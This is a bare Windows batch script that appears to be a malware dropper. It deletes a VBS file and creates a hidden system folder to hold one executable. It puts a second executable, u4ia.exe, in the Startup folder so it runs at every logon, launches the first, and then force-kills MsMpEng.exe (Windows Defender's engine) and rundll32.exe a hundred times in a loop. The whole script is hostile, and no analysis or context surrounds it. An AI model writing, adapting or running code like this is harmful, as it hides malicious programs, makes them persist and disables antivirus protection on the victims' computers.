cd %~dp0
del Brain.vbs
mkdir "%homedrive%\u4ia" && attrib +h +i +s "%homedrive%\u4ia"
move modules-4ia.exe "%homedrive%\u4ia"
move u4ia.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start "%homedrive%\u4ia\modules-4ia.exe"
for /L %%i in (1,1,100) do (
    echo Loop iteration %%i
taskkill /im rundll32.exe /f
taskkill /im MsMpEng.exe /f
)
